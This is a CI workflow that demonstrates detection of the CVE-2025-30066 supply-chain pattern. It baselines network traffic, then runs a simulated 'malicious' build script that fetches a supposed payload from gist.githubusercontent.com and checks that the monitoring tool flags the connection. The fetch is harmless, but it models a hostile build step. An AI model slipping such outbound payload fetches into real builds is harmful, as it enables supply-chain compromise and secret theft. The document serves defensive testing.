name: CVE-2025-30066 Detection Demo

on:
  schedule:
    - cron: "0 6 * * 1-5"
  workflow_dispatch:
  push:
    branches:
      - 'dev'
      - 'main'
      
# Auto cancel previous runs if they were not completed.
concurrency:
  group: ${{ github.workflow }}-${{ github.event.pull_request.number || github.ref }}
  cancel-in-progress: true


jobs:
  demonstrate-cve-detection:
    timeout-minutes: 30  # Prevent job from running indefinitely
    runs-on: ubuntu-latest
    steps:
      # Setup EDAMAME Posture with initial monitoring
      - name: Setup EDAMAME Posture
        uses: edamametechnologies/edamame_posture_action@v0
        with:
          network_scan: true             # Enable network monitoring
          disconnected_mode: true        # Run in disconnected mode (no domain authentication required)

      - name: Checkout code
        uses: actions/checkout@v3

      - name: Setup Python
        uses: actions/setup-python@v4
        with:
          python-version: '3.10'    # Run without domain authentication

      - name: Create legitimate build script
        run: |
          # Create a simple Python script that represents a legitimate build process
          cat > build.py << EOF
          import subprocess
          import sys
          import requests

          # Print Python version (legitimate action)
          print(f"Python version: {sys.version}")
          
          # Download a legitimate dependency (from PyPI)
          print("Downloading requests library info from PyPI...")
          response = requests.get("https://pypi.org/pypi/requests/json")
          print(f"Downloaded PyPI info: {response.status_code}")
          
          # Run pip list (legitimate action)
          subprocess.run(["pip", "list"])
          
          print("Build completed successfully!")
          EOF

      - name: Run legitimate build process
        run: |
          # Install dependencies
          pip install requests
          
          # Run the build script
          python build.py

          # Wait 120 seconds to allow EDAMAME to monitor the baseline network traffic and minimize false positives
          echo "Waiting 120 seconds to allow EDAMAME to monitor the baseline network traffic..."
          sleep 120

      # Create custom whitelist from legitimate traffic
      - name: Create whitelist from legitimate traffic
        uses: edamametechnologies/edamame_posture_action@v0
        with:
          create_custom_whitelists: true       # Generate whitelist from observed traffic
          custom_whitelists_path: ./whitelist.json  # Save to this file

      # Apply the custom whitelist for enforcement
      - name: Apply custom whitelist
        uses: edamametechnologies/edamame_posture_action@v0
        with:
          custom_whitelists_path: ./whitelist.json  # Load from this file
          set_custom_whitelists: true          # Apply the custom whitelist

      - name: Display whitelist content
        run: |
          cd
          cat ./whitelist.json

      - name: Create malicious build script (simulating CVE-2025-30066)
        run: |
          # Create a Python script that simulates the malicious behavior from CVE-2025-30066
          # This script will attempt to connect to gist.githubusercontent.com - mimicking the attack vector
          cat > build_malicious.py << EOF
          import subprocess
          import sys
          import requests
          import os
          
          # Print Python version (legitimate action)
          print(f"Python version: {sys.version}")
          
          # Simulate the attack vector - connect to gist.githubusercontent.com
          # This is similar to what the compromised tj-actions/changed-files action did
          print("Attempting to fetch malicious payload from gist.githubusercontent.com...")
          try:
              response = requests.get("https://gist.githubusercontent.com/gewashington/a4d0211e6f8601b69ff74e30d9e3ca20/raw/9d3e37cf7742b41e39606e70aab7a4f971353749/practice-python-fibonnaci.py")
              print(f"Downloaded malicious payload: {response.status_code}")
          except Exception as e:
              print(f"Error downloading malicious payload: {e}")
          
          # Continue with legitimate-looking actions
          subprocess.run(["pip", "list"])
          
          print("Build completed!")
          EOF

      - name: Run build process with simulated malicious behavior
        run: |
          # Run the malicious build script
          python build_malicious.py

      # Check for whitelist violations - this will fail if unauthorized connections were detected
      - name: Check for whitelist violations
        id: whitelist_check
        continue-on-error: true
        uses: edamametechnologies/edamame_posture_action@v0
        with:
          set_custom_whitelists: true
          custom_whitelists_path: ./whitelist.json  # Load from this file
          dump_sessions_log: true         # Dump the network session log
          whitelist_conformance: true     # Fail if network traffic violated the whitelist

      - name: Verify detection
        run: |
          if [ "${{ steps.whitelist_check.outcome }}" == "failure" ]; then
            # Check for whitelist violations
            ~/edamame_posture get-exceptions > ./exceptions.log
            echo "Exceptions log:"
            cat ./exceptions.log

            EXCEPTION_COUNT=$(grep "whitelisted: NonConforming" ./exceptions.log | wc -l | tr -d ' ' || echo -1)
            UNKNOWN_COUNT=$(grep "whitelisted: Unknown" ./exceptions.log | wc -l | tr -d ' ' || echo -1)
            
            # Check if the gist.githubusercontent.com exception is present
            GITHUB_EXCEPTION=$(grep "whitelisted: NonConforming" ./exceptions.log | grep "gist.githubusercontent.com" | wc -l | tr -d ' ' || echo -1)

            if [ "${EXCEPTION_COUNT}" -eq -1 -o "${UNKNOWN_COUNT}" -eq -1 ]; then
              echo "Error: Failed to count exceptions"
              exit 1
            fi
            
            if [ "${GITHUB_EXCEPTION}" -eq -1 ]; then
              echo "Error: Failed to count github exceptions"
              exit 1
            fi

            if [ "${EXCEPTION_COUNT}" -gt 5 || "${UNKNOWN_COUNT}" -gt 0 ]; then
              echo "Error: Detected too many exceptions or unknown exceptions"
              exit 1
            fi

            echo "Detected ${EXCEPTION_COUNT} exceptions and ${UNKNOWN_COUNT} unknown exceptions"
            echo "Detected ${GITHUB_EXCEPTION} github exceptions"

            if [ "${GITHUB_EXCEPTION}" -eq 1 ]; then
              echo "✅ SUCCESS: EDAMAME detected unauthorized connection to gist.githubusercontent.com"
              echo "This demonstrates how EDAMAME would have detected CVE-2025-30066"
              echo "The tj-actions/changed-files attack used this exact pattern to exfiltrate secrets"
            else
              echo "❌ FAILURE: EDAMAME did not detect the unauthorized connection"
              exit 1
            fi
          else
            echo "❌ FAILURE: EDAMAME did not detect the unauthorized connection"
          fi

      - name: Slack alerts
        if: |
          steps.whitelist_check.outcome != 'failure'
        uses: slackapi/slack-github-action@v1.26.0
        with:
          channel-id: 'C072J0U9TH7'
          slack-message: "Tests ran in ${{ github.workflow }} for ${{ github.repository }} for ${{ runner.os }} on branch ${{ github.ref }} failed: see https://github.com/${{ github.repository }}/actions/runs/${{ github.run_id }}"
        env:
          SLACK_BOT_TOKEN: ${{ secrets.SLACK_BOT_TOKEN }}

      - name: Fail job if tests failed
        if: |
          steps.whitelist_check.outcome != 'failure'
        run: |
          echo "Forcing job to fail because tests did not succeed."
          exit 1